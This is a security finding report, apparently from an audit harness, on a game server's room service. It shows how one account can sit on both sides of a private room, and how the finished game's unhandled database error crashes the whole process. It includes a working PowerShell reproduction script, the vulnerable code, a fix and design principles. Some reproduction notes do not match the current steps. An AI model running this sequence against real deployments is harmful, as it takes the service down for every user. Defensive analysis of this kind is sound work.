# F-006 — One logged-in user can be both players of a room; the end of that game kills the whole server process (exit code 1)

- **Status:** open — **REPRODUCED LIVE**, 3/3 repetitions (every repetition is a whole-process death), server built from this repository's HEAD, running locally on `http://127.0.0.1:3000`.
- **Severity:** critical (availability of the entire process; any authenticated user; five requests; deterministic, no race, no flooding).
- **Class:** CWE-668 (the membership check is derived from a filtered view the attacker controls) + CWE-391 (unobserved promise rejection).
- **Affected:** `packages/server`.
- **Accepted as an "internal error"** because the deployment's acceptance criteria include *"local server process exits or stops serving because of attacker-controlled input"*. It is **not** a volume/DoS outcome and **not** an HTTP 5xx: the triggering request never receives a response.

---

## Summary

The rule "one account may be in at most one room" is enforced in exactly one place, and that place reads a **filtered** room list.

`packages/server/src/rooms/rooms.service.ts` — the only duplicate-player check, inside `joinRoom()`:

```ts
private async joinRoom(playerInfo: PlayerInfo, roomId: number) {
  const allRooms = this.getAllRooms(true);          // <-- takes the *public lobby* view
  const room = this.rooms.get(roomId);
  if (!room) {
    throw new NotFoundException(`Room ${roomId} not found`);
  }
  if (room.status !== RoomStatus.Waiting) {
    throw new ConflictException(`Room ${roomId} is not waiting`);
  }
  if (playerInfo.isGuest && !room.config.allowGuest) {
    throw new UnauthorizedException(`Room ${roomId} does not allow guest`);
  }
  if (
    allRooms.some((room) => room.players.some((p) => p.id === playerInfo.id))
  ) {
    throw new ConflictException(
      `Player ${playerInfo.id} is already in a room`,
    );
  }
  // ... verifyDeck(room.config.gameVersion) ... then:
  room.setParticipant(new Player(playerInfo));      // <-- no check that this is not the host
```

`packages/server/src/rooms/rooms.service.ts` — and the list it reads deliberately hides rooms:

```ts
getAllRooms(guest: boolean): RoomInfo[] {
  const result: RoomInfo[] = [];
  for (const room of this.rooms.values()) {
    if (room.status === RoomStatus.Finished) {
      continue;
    }
    if (room.config.private) {
      continue;                                     // <-- hidden from the check
    }
    if (guest && !room.config.allowGuest) {
      continue;                                     // <-- hidden from the check
    }
    result.push(room.getRoomInfo());
  }
  return result;
}
```

`guest` is hard-coded to `true` at the call site, and both flags come straight from the request body (`packages/server/src/rooms/rooms.controller.ts`, `class CreateRoomDto`):

```ts
  @IsBoolean()
  @IsOptional()
  private?: boolean;

  @IsBoolean()
  @IsOptional()
  allowGuest?: boolean;
```

So the attacker decides whether their own room is visible to the only check that could stop them. `setParticipant()` only verifies that the slot is empty:

```ts
  setParticipant(player: Player) {
    if (this.participant !== null) {
      throw new ConflictException("participant already set");
    }
    this.participant = player;
    return flip(this.hostWho);
  }
```

The game therefore starts with the **same account on both sides**. When it ends, `Room.stop()` runs its handlers and does not await them (`packages/server/src/rooms/rooms.service.ts`):

```ts
  stop() {
    this.terminated = true;
    this.endedAt = new Date();
    this.players[0]?.complete();
    this.players[1]?.complete();
    for (const cb of this.onStopHandlers) {
      cb(this, this.game);            // <-- return value (a promise) is discarded
    }
  }
```

and the handler registered by `joinRoom()` writes the finished game **without `await` and without `catch`** (`packages/server/src/rooms/rooms.service.ts`, the handler registered at the end of `joinRoom`):

```ts
    room.onStop((room, game) => {
      if (!game) {
        return;
      }
      const players = room.getPlayers();
      const gameData = JSON.stringify(room.getStateLog());
      // ... optional S3 upload ...
      if (players.some((p) => p.playerInfo.isGuest)) {
        return;
      }
      const playerIds = players.map(
        (player) => player.playerInfo.id,
      ) as number[];
      const winnerWho = game.state.winner;
      const winnerId = winnerWho === null ? null : playerIds[winnerWho]!;
      this.games.addGame({                      // <-- not awaited, not caught
        coreVersion: Room.CORE_VERSION,
        gameVersion: room.config.gameVersion,
        data: gameData,
        winnerId,
        playerIds,
      });
    });
```

`packages/server/src/games/games.service.ts` writes one row per player:

```ts
  async addGame({ playerIds, ...data }: AddGameOption): Promise<GameModel> {
    const playerOnGames = playerIds.map((id, who) => ({
      playerId: id,
      who,
    }));
    const game = await this.prisma.game.create({
      data: {
        ...data,
        players: {
          create: playerOnGames,
        },
      },
    });
    this.metrics.incrementStoredGames();
    return game;
  }
```

and the table's primary key is the pair (`packages/server/prisma/schema.prisma`):

```prisma
model PlayerOnGames {
  player   User @relation(fields: [playerId], references: [id])
  playerId Int
  game   Game @relation(fields: [gameId], references: [id])
  gameId Int
  who      Int

  @@id([playerId, gameId])
}
```

With `playerIds = [X, X]` the insert is a **guaranteed** PostgreSQL unique violation (`23505`, constraint `PlayerOnGames_pkey`). The rejected promise belongs to nobody — not to the HTTP pipeline (so the Prisma exception filter never sees it), not to `stop()`, not to the game loop — so Node's default `--unhandled-rejections=throw` turns it into an uncaught exception and the process exits with code 1, taking every other game and room with it.

### Recorded server output at the moment of death

```
UniqueConstraintViolation  ...  constraint: { fields: [ '"playerId"', '"gameId"' ] }
cause: { originalCode: '23505',
         originalMessage: 'duplicate key value violates unique constraint "PlayerOnGames_pkey"' }
Node.js v26.8.2
[supervisor] server exited code=1
```

and, from the same second, `GET http://127.0.0.1:3000/api/hello` stops answering (`ECONNREFUSED`) — there is no HTTP status to observe.

---

## Reproduction

Assumes nothing is running: step 1 boots the deployment itself. Work from the repository root, and
once register a GitHub OAuth app for `http://127.0.0.1:3000/api/auth/github/callback`
(`security-harness/auth/oauth.env`; setup in `security-harness/auth/README.md`).

**What is precondition and what is attack.** The account is not part of the vulnerability: *any*
registered user can reach this state, so the attacker obtains its token the normal way, by logging
in with GitHub. Step 1 below therefore opens a real browser window on the local web client and runs
the production login flow - the app calls `window.open("https://github.com/login/oauth/authorize?
client_id=...&redirect_uri=http://127.0.0.1:3000/api/auth/github/callback")`, GitHub redirects to
`GET /api/auth/github/callback?code=...`, `AuthService.login()` exchanges the code, calls the live
GitHub user API and `users.create()`s the account, and the callback page hands the signed
`{ user: 1, sub: <github id> }` JWT back to the app, which stores it in `localStorage.accessToken`.
**The only manual action is typing GitHub credentials (+ 2FA) into the window that pops up**; the
harness waits, captures the token and exits. No database write, no hand-signed JWT, no
`GH_GET_USER_API_URL` stub - `GET /api/users/me` in step 2 is answered by the deployment calling the
live GitHub API with that token.

Everything after that handshake - create the deck, create the room, join it, give up - is a plain
HTTP request an ordinary logged-in client makes.

Paste the whole block into PowerShell:

```powershell
# Run this block from the repository root (step 1 below boots the deployment it talks to).
$env:PATH = "$PWD\.tools\node-v26.8.2-win-x64;$env:PATH"
$base = "http://127.0.0.1:3000"

# 1. PRECONDITION - a genuine login. This boots the local deployment in login-capable mode
#    (NODE_ENV=production, real GitHub endpoints), opens a browser window on the local app and
#    triggers the real GitHub authorize popup from inside that page. Finish the login in the
#    window that appears; the harness captures the token the app stores and exits by itself.
node security-harness\auth\login.mjs --as A --no-flow   # manual: finish the GitHub login in the popup it opens
$token = (Get-Content security-harness\.run\auth\A.json -Raw | ConvertFrom-Json).token
$auth = @{ authorization = "Bearer $token" }
$me = Invoke-RestMethod -Uri "$base/api/users/me" -Headers $auth
$myId = $me.id
"1. logged in as $($me.login) (id $myId)"

# 2. the deck, created through the deployment's own authenticated route
#    (this also proves the token is accepted by the deployment's guard: 403 without a real user)
$cards = @(311101,311102,311103,311104,311105,311106,311107,311108,311109,311110,311201,311202,311203,311204,311205) * 2
$deck = Invoke-RestMethod -Method POST -Uri "$base/api/decks" -Headers $auth -ContentType application/json -Body (@{ name = "audit-deck"; characters = @(1101,1102,1103); cards = $cards } | ConvertTo-Json -Compress -Depth 6)
$deckId = $deck.id
"2. deck ready: deckId $deckId"

# 3. control: an ordinary room + the same account joining it -> 409 (the guard exists)
$ctl = Invoke-RestMethod -Method POST -Uri "$base/api/rooms" -ContentType application/json -Headers $auth -Body (@{ hostDeckId = $deckId } | ConvertTo-Json -Compress)
$ctlJoin = Invoke-WebRequest -Method POST -Uri "$base/api/rooms/$($ctl.room.id)/players" -ContentType application/json -Headers $auth -Body (@{ deckId = $deckId } | ConvertTo-Json -Compress) -SkipHttpErrorCheck -UseBasicParsing
"3. control self-join: $($ctlJoin.StatusCode) $((($ctlJoin.Content | ConvertFrom-Json).message))"
Invoke-RestMethod -Method DELETE -Uri "$base/api/rooms/$($ctl.room.id)" -Headers $auth | Out-Null

$died = $false
foreach ($i in 1..4) {
  Start-Sleep -Milliseconds 500
  try { Invoke-WebRequest -Uri "$base/api/hello" -UseBasicParsing -TimeoutSec 2 | Out-Null } catch { $died = $true; break }
}
"3.5. GET /api/hello after the game ended: $(if ($died) { 'connection refused - the process is gone' } else { 'still answering' })"

# 4. attack: the same two requests, with the room hidden from the duplicate check
$atk = Invoke-RestMethod -Method POST -Uri "$base/api/rooms" -ContentType application/json -Headers $auth -Body (@{ hostDeckId = $deckId; private = $true } | ConvertTo-Json -Compress)
$atkJoin = Invoke-WebRequest -Method POST -Uri "$base/api/rooms/$($atk.room.id)/players" -ContentType application/json -Headers $auth -Body (@{ deckId = $deckId } | ConvertTo-Json -Compress) -SkipHttpErrorCheck -UseBasicParsing
$room = Invoke-RestMethod -Uri "$base/api/rooms/$($atk.room.id)" -Headers $auth
"4. attack create: 201 | self-join: $($atkJoin.StatusCode) | room: $($room.status) players: $($room.players.id -join ',')"

# 5. end the game: one player gives up
$gv = Invoke-WebRequest -Method POST -Uri "$base/api/rooms/$($atk.room.id)/players/$myId/giveUp" -ContentType application/json -Headers $auth -Body '{}' -SkipHttpErrorCheck -UseBasicParsing
"5. giveUp: $($gv.StatusCode)"

# 6. watch the process, not a status code
$died = $false
foreach ($i in 1..4) {
  Start-Sleep -Milliseconds 500
  try { Invoke-WebRequest -Uri "$base/api/hello" -UseBasicParsing -TimeoutSec 2 | Out-Null } catch { $died = $true; break }
}
"6. GET /api/hello after the game ended: $(if ($died) { 'connection refused - the process is gone' } else { 'still answering' })"
```

Expected shape (the trigger itself is unchanged; the identity is now a real GitHub account, so the
ids differ per operator):

```
1. logged in as <github login> (id <github id>)
2. deck ready: deckId 1
3. control self-join: 409 Player <github id> is already in a room
4. attack create: 201 | self-join: 201 | room: playing players: <github id>,<github id>
5. giveUp: 201
6. GET /api/hello after the game ended: connection refused - the process is gone
```

Recorded output of the original run (reps 1 and 3 use `private = $true`, rep 2 uses `allowGuest = $false`). The identity `424242` is the stand-in account the block above now replaces with a real login; the trigger and the outcome are unchanged:

```
1. account+deck ready: deckId 1
2. control self-join: 409 Player 424242 is already in a room
3. attack create: 201 | self-join: 201 | room: playing players: 424242,424242
4. giveUp: 201
5. GET /api/hello after the game ended: connection refused - the process is gone
```

Server log at the moment of death:

```
driverAdapterError: fP [DriverAdapterError]: UniqueConstraintViolation
    originalCode: '23505',
    originalMessage: 'duplicate key value violates unique constraint "PlayerOnGames_pkey"',
Node.js v26.8.2
[up-local] server exited code=1
```

Three repetitions:

| rep | variant | control self-join | attack self-join | room status | process |
| --- | --- | --- | --- | --- | --- |
| 1 | `private = $true` | 409 | **201** | `playing`, players `[424242, 424242]` | died (`PlayerOnGames_pkey` 23505, exit code 1) |
| 2 | `allowGuest = $false` | 409 | **201** | `playing`, players `[424242, 424242]` | died (`PlayerOnGames_pkey` 23505, exit code 1) |
| 3 | `private = $true` | 409 | **201** | `playing`, players `[424242, 424242]` | died (`PlayerOnGames_pkey` 23505, exit code 1) |

Because the trigger kills the process, the `User` row (step 2) has to be re-created after every
restart (the `ON CONFLICT DO NOTHING` makes that idempotent). `DELETE /api/rooms/:id` in step 4 is what
frees the account again before the attack.

**Side effects of the same root cause** (no extra input needed): both participants share one account,
`playerNotification()` resolves an SSE stream by `playerInfo.id`, so both
`/api/rooms/:id/players/<id>/notification` connections are served by `players[0]` and the opponent
never receives its own frames; and `currentRoom(playerId)` reports the account as being in a room
while `getAllRooms()` does not list it.
## Buggy code

`packages/server/src/rooms/rooms.service.ts` — the check reads the filtered list, and the filtered
list is what defines the attacker's freedom:

```ts
  private async joinRoom(playerInfo: PlayerInfo, roomId: number) {
    const allRooms = this.getAllRooms(true);
    const room = this.rooms.get(roomId);
    if (!room) {
      throw new NotFoundException(`Room ${roomId} not found`);
    }
    if (room.status !== RoomStatus.Waiting) {
      throw new ConflictException(`Room ${roomId} is not waiting`);
    }
    if (playerInfo.isGuest && !room.config.allowGuest) {
      throw new UnauthorizedException(`Room ${roomId} does not allow guest`);
    }
    if (
      allRooms.some((room) => room.players.some((p) => p.id === playerInfo.id))
    ) {
      throw new ConflictException(
        `Player ${playerInfo.id} is already in a room`,
      );
    }

    try {
      const version = await verifyDeck(playerInfo.deck);
      if (semver.compare(version, room.config.gameVersion) > 0) {
        throw new BadRequestException(
          `Deck version required ${version}, it's higher game version ${room.config.gameVersion}`,
        );
      }
    } catch (e) {
      if (e instanceof DeckVerificationError) {
        throw new BadRequestException(`Deck verification failed: ${e.message}`);
      } else {
        throw e;
      }
    }

    room.setParticipant(new Player(playerInfo));
```

```ts
  getAllRooms(guest: boolean): RoomInfo[] {
    const result: RoomInfo[] = [];
    for (const room of this.rooms.values()) {
      if (room.status === RoomStatus.Finished) {
        continue;
      }
      if (room.config.private) {
        continue;
      }
      if (guest && !room.config.allowGuest) {
        continue;
      }
      result.push(room.getRoomInfo());
    }
    return result;
  }
```

`packages/server/src/rooms/rooms.service.ts` — nothing compares the candidate with the host, and the
terminal write is an unobserved promise:

```ts
  setParticipant(player: Player) {
    if (this.participant !== null) {
      throw new ConflictException("participant already set");
    }
    this.participant = player;
    return flip(this.hostWho);
  }
```
```ts
  stop() {
    this.terminated = true;
    this.endedAt = new Date();
    this.players[0]?.complete();
    this.players[1]?.complete();
    for (const cb of this.onStopHandlers) {
      cb(this, this.game);
    }
  }
```
```ts
    room.onStop((room, game) => {
      if (!game) {
        return;
      }
      const players = room.getPlayers();
      const gameData = JSON.stringify(room.getStateLog());
      if (players.some((p) => p.playerInfo.isGuest)) {
        return;
      }
      const playerIds = players.map((player) => player.playerInfo.id) as number[];
      const winnerWho = game.state.winner;
      const winnerId = winnerWho === null ? null : playerIds[winnerWho]!;
      this.games.addGame({
        coreVersion: Room.CORE_VERSION,
        gameVersion: room.config.gameVersion,
        data: gameData,
        winnerId,
        playerIds,
      });
    });
```

`packages/server/src/games/games.service.ts` + `packages/server/prisma/schema.prisma` — the write that
cannot succeed:

```ts
  async addGame({ playerIds, ...data }: AddGameOption): Promise<GameModel> {
    const playerOnGames = playerIds.map((id, who) => ({ playerId: id, who }));
    const game = await this.prisma.game.create({
      data: { ...data, players: { create: playerOnGames } },
    });
    this.metrics.incrementStoredGames();
    return game;
  }
```
```prisma
model PlayerOnGames {
  playerId Int
  gameId   Int
  who      Int
  @@id([playerId, gameId])
}
```

---

## Fix

Enforce the invariant against the authoritative collection, refuse to seat the host as their own
opponent, and make the persistence of a finished game observable:

```ts
// packages/server/src/rooms/rooms.service.ts — joinRoom()
// The lobby view (getAllRooms) is a visibility filter; membership must be asked of the real rooms.
const alreadyInRoom = [...this.rooms.values()].some(
  (r) =>
    r.status !== RoomStatus.Finished &&
    r.getPlayers().some((p) => p.playerInfo.id === playerInfo.id),
);
if (alreadyInRoom) {
  throw new ConflictException(`Player ${playerInfo.id} is already in a room`);
}
if (room.getHost()?.playerInfo.id === playerInfo.id) {
  throw new ConflictException(`Player ${playerInfo.id} cannot join their own room`);
}
```

```ts
// packages/server/src/rooms/rooms.service.ts — the onStop handler
void this.games
  .addGame({
    coreVersion: Room.CORE_VERSION,
    gameVersion: room.config.gameVersion,
    data: gameData,
    winnerId,
    playerIds,
  })
  .catch((e) => {
    this.logger.error(`Failed to store game for room ${room.id}: ${e}`);
  });
```

```ts
// packages/server/src/main.ts — defence in depth: one lost game record must not kill the server
process.on("unhandledRejection", (reason) => {
  console.error("Unhandled rejection:", reason);
});
```

```prisma
// packages/server/prisma/schema.prisma — make the modelling error impossible to express
model PlayerOnGames {
  playerId Int
  gameId   Int
  who      Int
  @@id([playerId, gameId])
  @@unique([gameId, who])
}
```

---

## Principle

- **Never derive a security check from a filtered view.** `getAllRooms(guest)` answers "what may this
  caller *see*"; the duplicate-player rule needs "what *is*". Reusing the visibility filter as the
  membership check makes the decision depend on a flag the attacker controls — the check disappears
  exactly when the attacker asks it to.
- **An invariant must be checked where it can be violated.** `setParticipant()` has the host and the
  candidate in the same expression and verifies neither of them; `joinRoom()` is the last place where
  "host and opponent are the same account" could still have been rejected.
- **Fire-and-forget I/O is an availability bug, not a style issue.** A promise created in a lifecycle
  callback with no `await`/`catch` turns a data error into process death under Node's default
  rejection policy. `stop()` calling the handler is not ownership of the promise the handler creates.
- **A constraint the code cannot satisfy is a proof, not a runtime surprise.** Two `PlayerOnGames`
  rows keyed by `(playerId, gameId)` with a repeated `playerId` cannot coexist; the moment
  `playerIds` may contain a duplicate the write is guaranteed to fail — the only question is who sees
  the failure.

---

## Harness bookkeeping (not needed to reproduce)

- Probe `S6` (`probes/S6-self-join-process-crash.probe.mjs`, `expect: internal-error`) runs the
  sequence above three times, restarting the deployment between repetitions because each one kills it.
- First raw capture: `evidence/2026-09-11T18-50-40-778Z/self-join/`. Recorded probe run:
  `evidence/2026-09-11T18-55-34-920Z/S6-self-join-process-crash.json`.